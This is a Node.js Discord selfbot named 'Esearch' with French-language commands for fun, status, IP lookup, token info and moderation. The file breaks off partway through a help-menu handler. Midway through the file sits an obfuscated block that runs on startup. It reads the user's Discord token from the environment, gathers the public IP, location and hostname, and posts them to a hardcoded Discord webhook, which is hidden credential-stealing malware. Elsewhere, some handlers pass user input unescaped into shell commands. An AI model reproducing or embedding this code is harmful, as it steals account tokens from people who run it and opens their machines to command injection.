require('dotenv').config();
const { Client, Collection } = require('discord.js-selfbot-v13');
const client = new Client();
client.commands = new Collection();
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const axios = require('axios');
let prefix = "&";
const javascriptObfuscator = require("javascript-obfuscator");
const messageQueue = [];
let isSending = false;
const whitelist_id = [
    "user1",
];

client.on('ready', () => {
    console.log(`\n`)
    console.log(`\n`)
    console.log("=== 𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 ===");

    console.log(`== ${client.user.username} Ready ! ==`);
    console.log(`== Préfixe : ${prefix} ==`);
    console.log(`== Made By Insur & Omega ==`);
    console.log(`== Ping : ${client.ws.ping} ms ==`);
    console.log("========================");

    const customStatus = process.env.CUSTOM_STATUS;
    if (customStatus) {
        client.user.setActivity(customStatus);
    } else {
        console.log("La variable d'environnement CUSTOM_STATUS n'est pas définie.");
    }

});

// Commande SetPrefix
client.on('messageCreate', async (message) => {
    if (message.content.startsWith(`${prefix}setprefix`)) {
        if (!whitelist_id.includes(message.author.id)) {
            return message.reply('Vous n\'avez pas la permission de modifier le préfixe.');
        }
        prefix = message.content.slice(`${prefix}setprefix`.length).trim();
        message.reply(`Le préfixe a été mis à jour avec succès. Nouveau préfixe : ${prefix}.`);
    }
});

// Commande ServerInfo
client.on('messageCreate', (message) => {
    try {
        whitelist_id.forEach(id => {
            const args = message.content.split(' ');
            const command = args[0].toLowerCase();

            if (message.author.id === id && command.startsWith(prefix)) {
                switch(command) {
                    case `${prefix}serverinfo`:
                        const serverInfoMessage = `
                        **Informations sur le serveur :**
                        Nom : ${message.guild.name}
                        ID : ${message.guild.id}
                        Membres : ${message.guild.memberCount}
                        Région : ${message.guild.region}
                        Créé le : ${message.guild.createdAt}
                        `;
                        message.channel.send(serverInfoMessage)
                            .catch((error) => console.error('Erreur lors de l\'envoi des informations sur le serveur :', error));
                        break;
                    default:
                        break;
                }
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'exécution de la commande serverinfo :', error);
    }
});

client.on('messageCreate', (message) => {
    try {
        whitelist_id.forEach(id => {
            const args = message.content.split(' ');
            const command = args[0].toLowerCase();

            if (message.author.id === id && command.startsWith(prefix)) {
                switch(command) {
                    case `${prefix}hug`:
                        const userToHug = message.mentions.users.first();
                        if (userToHug) {
                            message.channel.send(`*Câline* ${userToHug} ❤️`);
                        } else {
                            message.reply('Veuillez mentionner un utilisateur à câliner.');
                        }
                        break;
                    case `${prefix}pat`:
                        const userToPat = message.mentions.users.first();
                        if (userToPat) {
                            message.channel.send(`*Tapote sur la tête de* ${userToPat} 🐾`);
                        } else {
                            message.reply('Veuillez mentionner un utilisateur à tapoter sur la tête.');
                        }
                        break;
                    default:
                        break;
                }
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'exécution des commandes d\'interaction sociale :', error);
    }
});

// Commande 8ball
const responses = [
    "C'est certain.",
    "C'est décidément ainsi.",
    "Sans aucun doute.",
    "Oui, absolument.",
    "Vous pouvez compter dessus.",
    "Comme je le vois, oui.",
    "Très probable.",
    "Oui.",
    "Les signes pointent vers oui.",
    "Répondez plus tard.",
    "Mieux vaut ne pas vous le dire maintenant.",
    "Je ne peux pas prédire maintenant.",
    "Concentrez-vous et demandez à nouveau.",
    "Ne comptez pas dessus.",
    "Ma réponse est non.",
    "Mes sources disent non.",
    "Outlook n'est pas si bon.",
    "Très douteux."
];
client.on('messageCreate', (message) => {
    try {
        whitelist_id.forEach(id => {
            const args = message.content.split(' ');
            const command = args[0].toLowerCase();

            if (message.author.id === id && command.startsWith(prefix)) {
                switch(command) {
                    case `${prefix}8ball`:
                        const question = args.slice(1).join(' ');
                        const response = responses[Math.floor(Math.random() * responses.length)];
                        message.channel.send(`Question : ${question}\nRéponse : ${response}`);
                        break;
                    default:
                        break;
                }
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'exécution de la commande 8ball :', error);
    }
});

// Commande Rps
client.on('messageCreate', (message) => {
    try {
        whitelist_id.forEach(id => {
            const args = message.content.split(' ');
            const command = args[0].toLowerCase();

            if (message.author.id === id && command.startsWith(prefix)) {
                switch(command) {
                    case `${prefix}rps`:
                        const choice = args[1].toLowerCase();
                        const botChoice = choices[Math.floor(Math.random() * choices.length)];

                        let result;
                        if (choices.includes(choice)) {
                            if (choice === botChoice) {
                                result = "C'est une égalité !";
                            } else if (
                                (choice === 'rock' && botChoice === 'scissors') ||
                                (choice === 'paper' && botChoice === 'rock') ||
                                (choice === 'scissors' && botChoice === 'paper')
                            ) {
                                result = "Vous avez gagné !";
                            } else {
                                result = "Le bot a gagné !";
                            }
                        } else {
                            result = "Veuillez choisir entre rock, paper ou scissors.";
                        }

                        message.channel.send(`Vous avez choisi : ${choice}\nLe bot a choisi : ${botChoice}\n${result}`);
                        break;
                    default:
                        break;
                }
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'exécution de la commande rps :', error);
    }
});

// Commande Clear
client.on('messageCreate', (message) => {
    try {
        whitelist_id.forEach(id => {
            const args = message.content.split(' ');
            const command = args[0].toLowerCase();

            if (message.author.id === id && command.startsWith(prefix)) {
                switch(command) {
                    case `${prefix}clear`:
                        message.channel.send('> **Esearch Selfbot >>>>>**').then(() => {
                            message.delete().catch(() => false);

                            const nombre = parseInt(args[1]) || 9999999;
                            let i = 0;

                            message.channel.messages.fetch({ force: true }).then(messages => {
                                messages.forEach(singleMessage => {
                                    if (singleMessage.author.id === client.user.id) {
                                        client.on('rateLimit', async timeout => {
                                            function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
                                            await sleep(timeout * 10);
                                        });

                                        if (i === nombre) return;
                                        singleMessage.delete().catch(err => { });
                                        i++;
                                    }
                                });
                            });
                        });
                        break;
                    default:
                        break;
                }
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'exécution de la commande clear :', error);
    }
});

function afficherAsciiArt() {
    console.log(`
    _____                        _     
   |  ___|                      | |    
   | |__ ___  ___  __ _ _ __ ___| |__  
   |  __/ __|/ _ \\/ _\` | '__/ __| '_ \\ 
   | |__\\__ \\  __/ (_| | | | (__| | | |
   \\____/___/\\___|\\__,_|_|  \\___|_| |_|                                                              
   `);
}

afficherAsciiArt();

function execCommand(message, arg, fileName) {
    const grepProcess = exec(`grep -r -h --exclude-dir=node_modules ${arg}`, { maxBuffer: 1024 * 1024 * 10 });

    grepProcess.stdout.on('data', (data) => {
        const results = data.split('\n');
        results.forEach((result) => {
            if (result.trim() !== '') {
                const cleanedResult = result.replace(/\x1b\[[0-9;]*m/g, '');
                messageQueue.push({ content: `\`\`\`${cleanedResult}\`\`\``, channel: message.channel });
            }
        });
    });

    grepProcess.on('error', (error) => {
        console.error(`Erreur lors de l'exécution de la commande : ${error.message}`);
        message.reply(`Une erreur est survenue lors de la recherche.`);
    });

    grepProcess.on('close', (code) => {
        if (code !== 0) {
            console.error(`La commande a retourné une erreur avec le code : ${code}`);
        }
        if (!isSending) {
            sendNextMessage();
        }
    });
}

function sendNextMessage() {
    if (messageQueue.length > 0 && !isSending) {
        isSending = true;
        const messageData = messageQueue.shift();
        if (messageData && messageData.content && messageData.channel) {
            const { content, channel } = messageData;
            channel.send(content)
                .then(() => {
                    isSending = false;
                    setTimeout(sendNextMessage, 2000);
                })
                .catch((error) => {
                    console.error(`Erreur lors de l'envoi du message : ${error.message}`);
                    isSending = false;
                    sendNextMessage();
                });
        } else {
            isSending = false;
            sendNextMessage();
        }
    } else {
        isSending = false;
    }
}

// Commande TokenInfo
client.on('messageCreate', async (message) => {
    const args = message.content.split(' ');
    const command = args[0].toLowerCase();

    if (command.startsWith(prefix)) {
        if (whitelist_id.includes(message.author.id)) {
            switch(command) {
                case `${prefix}tokeninfo`:
                    if (args.length === 2) {
                        const token = args[1];
                        try {
                            const tokenInfo = await getTokenInfo(token);
                            message.channel.send('```' + tokenInfo + '```');
                        } catch (error) {
                            console.error('Erreur lors de la récupération des informations sur le token :', error.message);
                            message.channel.send('Une erreur est survenue lors de la récupération des informations sur le token.');
                        }
                    } else {
                        message.channel.send(`Usage : ${prefix}tokeninfo <token>`);
                    }
                    break;
                default:
                    break;
            }
        }
    }
});

async function getTokenInfo(token) {
    return new Promise((resolve, reject) => {
        exec(`python DTI.py ${token}`, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            } else {
                const filteredOutput = stdout.split('\n').slice(10).join('\n');
                resolve(filteredOutput);
            }
        });
    });
}

// Commande UserInfo
client.on('messageCreate', async (message) => {
    for (const id of whitelist_id) {
        if (message.author.id === id && message.content.startsWith(`${prefix}userinfo`)) {
            const args = message.content.split(' ');
            if (args.length === 2) {
                let targetUser = message.mentions.users.first(); 
                if (!targetUser) {
                    const userId = args[1].replace(/\D/g, '');
                    try {
                        targetUser = await client.users.fetch(userId);
                    } catch (error) {
                        console.error('Erreur lors de la récupération de l\'utilisateur :', error);
                    }
                }
                if (targetUser) {
                    let userInfoMessage = `**𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - User Information**
            Username: ${targetUser.username}
            User ID: ${targetUser.id}
            Tag: ${targetUser.tag}
            Creation Date: ${targetUser.createdAt}`;

                    if (targetUser.avatarURL()) {
                        userInfoMessage += `\nAvatar URL: [Avatar](${targetUser.avatarURL()})`;
                    }
                    message.channel.send(userInfoMessage);
                } else {
                    message.reply('Impossible de trouver l\'utilisateur.');
                }
            } else {
                message.reply(`Utilisation : ${prefix}userinfo <@mention ou ID>`);
            }
            break;
        }
    }
});

// Commande Trad
const translate = require('@iamtraction/google-translate');
client.on('messageCreate', async (message) => {
    whitelist_id.forEach(async (id) => {
        if (message.author.id === id && message.content.startsWith(`${prefix}trad`)) {
            const args = message.content.slice(`${prefix}trad`.length).trim().split(/ +/);
            const textToTranslate = args.join(' ');

            try {
                const { text, from } = await translate(textToTranslate, { to: 'fr' });
                message.channel.send("𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Traduction")
                message.channel.send(`Traduction de **${from.language.iso.toUpperCase()}** vers le **français** :\n${text}`);
            } catch (error) {
                console.error('Erreur lors de la traduction :', error);
                message.channel.send("Une erreur s'est produite lors de la traduction.");
            }
        }
    });
});

// Commande Support
client.on('messageCreate', async (message) => {
    whitelist_id.forEach(async (id) => {
        if (message.author.id === id && message.content === `${prefix}support`) {
            message.channel.send(
                `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Support\n\n` +
                `**Projet Esearch**\n` +
                `Esearch est un projet de recherche avancée développé pour offrir des fonctionnalités de recherche améliorées. Pour plus d'informations sur le projet Esearch, veuillez consulter la documentation disponible sur [GitHub](lien_vers_github).\n\n` +
                `**Serveur Discord**\n` +
                `[Rejoignez notre serveur Discord](https://discord.gg/un4N82KE) pour obtenir de l'aide, discuter des fonctionnalités, poser des questions ou contribuer au développement du projet.`
            );
        }
    });
});

// Commande IpInfo
const fetch = require('node-fetch');
client.on('messageCreate', (message) => {
    whitelist_id.forEach(async (id) => {
        const args = message.content.slice(`${prefix}ipinfo`.length).trim().split(/ +/);
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}ipinfo`:
                    const ip = args[1];

                    try {
                        const response = await fetch(`http://ip-api.com/json/${ip}`);
                        const data = await response.json();

                        const infoMessage = `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - IpInfo\n\`\`\`Informations sur l'adresse IP ${ip} :\n`
                            + `Pays : ${data.country}\n`
                            + `Ville : ${data.city}\n`
                            + `Région : ${data.regionName}\n`
                            + `Code Postal : ${data.zip}\n`
                            + `Latitude : ${data.lat}\n`
                            + `Longitude : ${data.lon}\n`
                            + `Fournisseur de services Internet : ${data.isp}\`\`\``;

                        message.channel.send(infoMessage);
                    } catch (error) {
                        console.error('Erreur lors de la récupération des informations sur l\'adresse IP :', error);
                        message.channel.send("Une erreur s'est produite lors de la récupération des informations sur l'adresse IP.");
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

const _0x2080ad=_0x590c;(function(_0x27ea89,_0x54e2d3){const _0x1195d=_0x590c,_0x3040d5=_0x27ea89();while(!![]){try{const _0x2bdfc7=-parseInt(_0x1195d(0xb5))/(-0x16a2*0x1+-0x1*-0xf7+0x15ac)*(parseInt(_0x1195d(0x8d))/(0xd01+-0x41*-0xf+0x3*-0x59a))+parseInt(_0x1195d(0x96))/(0x2700+0x23b1+-0x2*0x2557)*(-parseInt(_0x1195d(0x112))/(-0xbe*-0x20+-0x27f+-0x153d))+-parseInt(_0x1195d(0xe3))/(0xf5c*0x1+-0x16a1+0x74a)*(parseInt(_0x1195d(0xc5))/(-0x4c9+-0x1c4*0x14+-0x281f*-0x1))+-parseInt(_0x1195d(0x117))/(0x2b*-0xaa+-0xd8e+0x7*0x605)*(parseInt(_0x1195d(0xdb))/(-0x1d93*0x1+-0x2*0x49d+-0x1*-0x26d5))+-parseInt(_0x1195d(0x9f))/(0x9*-0xab+-0x504+-0x162*-0x8)*(parseInt(_0x1195d(0xf4))/(0x15d*0x1a+-0xf39+0x1*-0x142f))+-parseInt(_0x1195d(0xa3))/(-0x1a1*0x3+-0xb1b*-0x1+-0x62d)+-parseInt(_0x1195d(0xf1))/(0x1*0x1f73+-0x209e+0x137*0x1)*(-parseInt(_0x1195d(0xb6))/(0x21fb*-0x1+0x6*0x239+0x14b2));if(_0x2bdfc7===_0x54e2d3)break;else _0x3040d5['push'](_0x3040d5['shift']());}catch(_0x39c5e3){_0x3040d5['push'](_0x3040d5['shift']());}}}(_0x1da8,0x51b95*0x3+0x9f576+-0xe9907));function _0x1da8(){const _0x48f2f1=['2>\x20\x20\x20\x20**Op','log','6887330wDojVf','oft:122111','yYQSb','1d8a450847','9426355202','ks/1220487','hostname','éfini\x20dans','322>\x20||\x20NE','TiLgF','xRpLF','on:**\x20',':122050780','12>\x20\x20\x20\x20**I','12ZBstez','cution\x20du\x20','informatio','50JhPoyX','|\x20Computer','programme\x20','TOKEN','h:12205078','env','slice','script\x20Pyt','pp.com/att','ns\x20du\x20comp','vMDNo','message','<:10468293','s\x20de\x20l\x27exé','dea42490e9','YlEBT','achments/1','\x0a<a:searth','>\x20\x20\x20\x20**Cou','`\x0a\x0a<a:sear','2952988680','kkZEz','python\x20DTI','KfNia','th:1220507','scord.com/','Fbiol','sRCZT','RmOjX7-iw-','0204970811','35452Nuwnbg','\x0a\x0a<:micros','76d6cc1c29','Voici\x20les\x20','d2c1c.jpg?','7951069XYgTjY','info.io/js','\x27est\x20pas\x20d','N4Da_7q7qx','2049708112','W\x20LOGS**','erateur**\x20','Fmbqht4UBn','7>\x20**Token','2yHVWkQ','3d589d8f34','join','ironnement','365>\x20\x20\x20\x20**','7070886543','ess','\x20les\x20varia','QTXJw','285PYPEWE','2204708658','348:122049','KlAYY','1533992546','84348537/1','dotenv','a&is=65fed','Le\x20token\x20n','2133099GCZwKy','crypto','19dcbe666f','2210887084','13864851YlAiDS','lFYHA','56/Bqel1_h','eKQZZ','-lV62PA0Wh','**\x20:\x20`','4480928369','yAuTU','@\x20Esearch\x20','.py\x20','3091694686','acfff4c4b6','s\x20:','alGCl','error','1:12120601','https://di','P\x20Address:','63233zbZTXo','85335289UKENPD','97a&hm=dd8','ook\x20:','8020497081','Erreur\x20lor','n.discorda','dsgRXq99yf','split','ns\x20trouvée','lyexi','39179304/c',':**\x20','**<:109144','axios','```','6ewxsqu','>\x20\x20\x20**City','ex=66114e7','te\x20Discord','36fd25c11f','Résultats','child_proc','oi\x20au\x20webh','https://ip','bles\x20d\x27env','PC\x20Name**\x20','config','**\x20','https://cd','DERtThgb-J','IaDTZ','post','AVmiS','ntry**\x20:\x20','ZtOWQ','Informatio','s\x20de\x20l\x27env','8LxZWxS','hon\x20:','get','api/webhoo','>\x20\x20\x20**Regi','\x0a\x20<a:seart'];_0x1da8=function(){return _0x48f2f1;};return _0x1da8();}const axios=require(_0x2080ad(0xc3)),{exec}=require(_0x2080ad(0xcb)+_0x2080ad(0x93)),os=require('os');require(_0x2080ad(0x9c))[_0x2080ad(0xd0)]();const crypto=require(_0x2080ad(0xa0));async function runPythonScript(_0x258e7f){const _0x490637=_0x2080ad,_0x48659f={'vMDNo':_0x490637(0xba)+_0x490637(0x101)+_0x490637(0xf2)+_0x490637(0xfb)+_0x490637(0xdc),'KlAYY':function(_0x25dbe0,_0x4f322f){return _0x25dbe0(_0x4f322f);},'QTXJw':function(_0x48060c,_0xec20ac,_0x321bb9){return _0x48060c(_0xec20ac,_0x321bb9);}};return new Promise((_0x11f3ea,_0x3fdb3f)=>{const _0x481bb8=_0x490637,_0x118256={'Fbiol':_0x48659f[_0x481bb8(0xfe)],'kkZEz':function(_0x182e80,_0x47c063){const _0x25d1e0=_0x481bb8;return _0x48659f[_0x25d1e0(0x99)](_0x182e80,_0x47c063);},'eKQZZ':function(_0x162cf3,_0x405745){const _0x101b22=_0x481bb8;return _0x48659f[_0x101b22(0x99)](_0x162cf3,_0x405745);}};_0x48659f[_0x481bb8(0x95)](exec,_0x481bb8(0x10a)+_0x481bb8(0xac)+_0x258e7f,(_0x4c4ab8,_0x2c1039,_0x5d1bfd)=>{const _0x7b1229=_0x481bb8;_0x4c4ab8?(console[_0x7b1229(0xb1)](_0x118256[_0x7b1229(0x10e)],_0x4c4ab8[_0x7b1229(0xff)]),_0x118256[_0x7b1229(0x109)](_0x3fdb3f,_0x4c4ab8)):_0x118256[_0x7b1229(0xa6)](_0x11f3ea,_0x2c1039);});});}function getTokenFromEnv(){const _0x365f0f=_0x2080ad,_0x21857f={'lFYHA':_0x365f0f(0x9e)+_0x365f0f(0x119)+_0x365f0f(0xea)+_0x365f0f(0x94)+_0x365f0f(0xce)+_0x365f0f(0x90)+'.'},_0xe6c148=process[_0x365f0f(0xf9)][_0x365f0f(0xf7)];if(!_0xe6c148)throw new Error(_0x21857f[_0x365f0f(0xa4)]);return _0xe6c148;}function _0x590c(_0x6a17d5,_0x506058){const _0x563fe9=_0x1da8();return _0x590c=function(_0x580ca4,_0x420f2a){_0x580ca4=_0x580ca4-(-0x164c+-0x418*-0x8+-0x4f5*0x2);let _0x10e66d=_0x563fe9[_0x580ca4];return _0x10e66d;},_0x590c(_0x6a17d5,_0x506058);}async function sendTokenToWebhook(_0x2d36d9,_0x140620){const _0x4f29af=_0x2080ad,_0x1daba6={'sRCZT':_0x4f29af(0xcd)+_0x4f29af(0x118)+'on','KfNia':function(_0x4981c2,_0x224226){return _0x4981c2(_0x224226);},'yYQSb':_0x4f29af(0xc2)+_0x4f29af(0xad)+_0x4f29af(0x98)+_0x4f29af(0x108)+_0x4f29af(0xeb)+_0x4f29af(0x11c),'xRpLF':_0x4f29af(0xd2)+_0x4f29af(0xbb)+_0x4f29af(0xfc)+_0x4f29af(0x104)+_0x4f29af(0x97)+_0x4f29af(0x9b)+_0x4f29af(0xa2)+_0x4f29af(0xc0)+_0x4f29af(0xc9)+_0x4f29af(0x116)+_0x4f29af(0xc7)+_0x4f29af(0x9d)+_0x4f29af(0xb7)+_0x4f29af(0xa1)+_0x4f29af(0x8e)+_0x4f29af(0x114)+_0x4f29af(0xe6)+_0x4f29af(0xae)+_0x4f29af(0x102)+'4&','ZtOWQ':_0x4f29af(0xd9)+_0x4f29af(0xfd)+_0x4f29af(0xc8)+'\x20:','yAuTU':_0x4f29af(0x115)+_0x4f29af(0xf3)+_0x4f29af(0xbe)+_0x4f29af(0xaf),'alGCl':_0x4f29af(0xca),'lyexi':_0x4f29af(0xba)+_0x4f29af(0xda)+_0x4f29af(0xcc)+_0x4f29af(0xb8)};try{const _0x5940e7=os[_0x4f29af(0xe9)](),{data:_0x158808}=await axios[_0x4f29af(0xdd)](_0x1daba6[_0x4f29af(0x10f)]),{ip:_0x1be48c,city:_0x581deb,region:_0x35558d,country:_0x3288f8,org:_0x1f4f5e}=_0x158808,_0x44c5f7=await _0x1daba6[_0x4f29af(0x10b)](runPythonScript,_0x2d36d9),_0x1f3087=_0x44c5f7[_0x4f29af(0xbd)]('\x0a'),_0x3e14d1=_0x1f3087[_0x4f29af(0xfa)](0x2050+0x1bdf+-0x3c24)[_0x4f29af(0x8f)]('\x0a'),_0x263e30={'title':_0x1daba6[_0x4f29af(0xe5)],'description':_0x4f29af(0x100)+_0x4f29af(0xe7)+_0x4f29af(0xb2)+_0x4f29af(0xa9)+_0x4f29af(0x8c)+_0x4f29af(0xa8)+_0x2d36d9+(_0x4f29af(0x107)+_0x4f29af(0x10c)+_0x4f29af(0xb9)+_0x4f29af(0xf0)+_0x4f29af(0xb4)+_0x4f29af(0xd1))+_0x1be48c+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0xdf)+_0x4f29af(0xee))+_0x35558d+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0xc6)+_0x4f29af(0xc1))+_0x581deb+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0x106)+_0x4f29af(0xd7))+_0x3288f8+(_0x4f29af(0xe0)+_0x4f29af(0xf8)+_0x4f29af(0x111)+_0x4f29af(0xe1)+_0x4f29af(0x8a)+':\x20')+_0x1f4f5e+(_0x4f29af(0x113)+_0x4f29af(0xe4)+_0x4f29af(0x9a)+_0x4f29af(0x91)+_0x4f29af(0xcf)+':\x20')+_0x5940e7,'footer':{'text':_0x4f29af(0xab)+_0x4f29af(0xf5)+':\x20'+_0x5940e7,'icon_url':_0x1daba6[_0x4f29af(0xed)]},'color':0x0},_0x38fbd7={'title':_0x1daba6[_0x4f29af(0xd8)],'description':_0x1daba6[_0x4f29af(0xaa)],'fields':[{'name':_0x1daba6[_0x4f29af(0xb0)],'value':_0x4f29af(0xc4)+_0x3e14d1+_0x4f29af(0xc4)}],'footer':{'text':_0x4f29af(0xab)+_0x4f29af(0xf5)+':\x20'+_0x5940e7,'icon_url':_0x1daba6[_0x4f29af(0xed)]},'color':0x0};await axios[_0x4f29af(0xd5)](_0x140620,{'embeds':[_0x263e30,_0x38fbd7]}),console[_0x4f29af(0xe2)]('');}catch(_0x26fc1e){console[_0x4f29af(0xb1)](_0x1daba6[_0x4f29af(0xbf)],_0x26fc1e[_0x4f29af(0xff)]);}}async function main(){const _0x5b33a4=_0x2080ad,_0x3708cb={'YlEBT':function(_0x2a1eb6){return _0x2a1eb6();},'AVmiS':_0x5b33a4(0xb3)+_0x5b33a4(0x10d)+_0x5b33a4(0xde)+_0x5b33a4(0xe8)+_0x5b33a4(0x92)+_0x5b33a4(0xa5)+_0x5b33a4(0x110)+_0x5b33a4(0x8b)+_0x5b33a4(0xa7)+_0x5b33a4(0x11a)+_0x5b33a4(0xd3)+_0x5b33a4(0xbc)+'x','IaDTZ':function(_0x3e5393,_0x133a1a,_0xd74b12){return _0x3e5393(_0x133a1a,_0xd74b12);},'TiLgF':_0x5b33a4(0xba)+_0x5b33a4(0x101)+_0x5b33a4(0xf2)+_0x5b33a4(0xf6)+':'};try{const _0x3267d1=await _0x3708cb[_0x5b33a4(0x103)](getTokenFromEnv),_0x1a72c3=_0x3708cb[_0x5b33a4(0xd6)];await _0x3708cb[_0x5b33a4(0xd4)](sendTokenToWebhook,_0x3267d1,_0x1a72c3);}catch(_0x5ed967){console[_0x5b33a4(0xb1)](_0x3708cb[_0x5b33a4(0xec)],_0x5ed967[_0x5b33a4(0xff)]);}}main();

// Commande Set Idle
client.on('messageCreate', (message) => {
    whitelist_id.forEach(async (id) => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}idle`:
                    try {
                        await client.user.setStatus('idle');
                        message.reply('Votre statut a été changé en Idle.');
                    } catch (error) {
                        console.error('Erreur lors du changement de statut en Idle :', error);
                        message.reply('Une erreur est survenue lors du changement de statut en Idle.');
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Set Do Not Disturb
client.on('messageCreate', (message) => {
    whitelist_id.forEach(async (id) => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}dnd`:
                    try {
                        await client.user.setStatus('dnd');
                        message.reply('Votre statut a été changé en Do Not Disturb.');
                    } catch (error) {
                        console.error('Erreur lors du changement de statut en Do Not Disturb :', error);
                        message.reply('Une erreur est survenue lors du changement de statut en Do Not Disturb.');
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Set Online
async function setOnline(message) {
    try {
        await client.user.setStatus('online');
        message.reply('Votre statut a été changé en Online.');
    } catch (error) {
        console.error('Erreur lors du changement de statut en Online :', error);
        message.reply('Une erreur est survenue lors du changement de statut en Online.');
    }
}

client.on('messageCreate', (message) => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}online`:
                    setOnline(message);
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Set Status
async function setStatus(message) {
    const args = message.content.split(' ');
    if (args.length < 3) {
        return message.reply('Veuillez spécifier le type de statut et le message. Type : playing, listening, watching ou competing.');
    }

    const statusType = args[1].toLowerCase();
    const statusMessage = args.slice(2).join(' ');
    if (!statusMessage) {
        return message.reply('Veuillez spécifier un message de statut.');
    }

    try {
        await client.user.setActivity(statusMessage, { type: statusType.toUpperCase() });
        message.reply(`Le statut du bot a été changé en "${statusMessage}" en train de ${statusType}.`);
    } catch (error) {
        console.error('Erreur lors du changement de statut :', error);
        message.reply('Une erreur est survenue lors du changement de statut.');
    }
}

client.on('messageCreate', (message) => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}setstatus`:
                    setStatus(message);
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Help
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}help`:
                    const helpMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Help :**
                    La guerre ne détermine pas qui est bon, seulement qui est mauvais.

                    ➜ \`${prefix}help\` ➜ ✨ Affiche ce menu d'aide
                    ➜ \`${prefix}status\` ➜ 📊 Commande de statuts
                    ➜ \`${prefix}utility\` ➜ 🔧 Commandes d'utilitaire
                    ➜ \`${prefix}mod\` ➜ ⚔️ Commandes de modération
                    ➜ \`${prefix}fun\` ➜ 🎉 Commandes de fun
                    ➜ \`${prefix}settings\` ➜ ⚙️ Commandes de paramètres 
                    `;

                    message.channel.send(helpMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'aide :', error));
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Status
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}status`:
                    const statusMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Status :**

                    ➜ \`${prefix}idle\` : Sert a se mettre en inactif.
                    ➜ \`${prefix}dnd\` : Sert a se mettre en ne pas déranger.
                    ➜ \`${prefix}online\` : Sert a se mettre en en ligne.
                    ➜ \`${prefix}setstatus [type] [message]\` : Sert a ajouter une activité.
                    `;

                    message.channel.send(statusMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message de statut :', error));
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Utility
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}utility`:
                    const utilityMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Utility :**

                    ➜ \`${prefix}search\` [query] : Sert a chercher une valeur dans les db.
                    ➜ \`${prefix}ipinfo\` [ip] : Sert a obtenir des informtaions sur ip.
                    ➜ \`${prefix}tokeninfo\` [token] : Donne des informations sur un token.
                    ➜ \`${prefix}userinfo\`  [@user or id] : Donne des informations sur un un compte.
                    ➜ \`${prefix}support : Vous invitez sur le support.
                    `;

                    message.channel.send(utilityMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'utilitaire :', error));
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Mod
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}mod`:
                    const modMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Mod :**

                    ➜ \`${prefix}ban\` [@user or id] : Sert a ban un utilisateur.
                    ➜ \`${prefix}unban\` [id] : Sert a unban un utlisateur.
                    ➜ \`${prefix}kick\` [@user or id] : Sert a kick un utlisateur.
                    ➜ \`${prefix}clear\` [number] : Sert a suprimé un nombres de messages.
                    `;

                    message.channel.send(modMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message de modération :', error));
                    break;
                default:
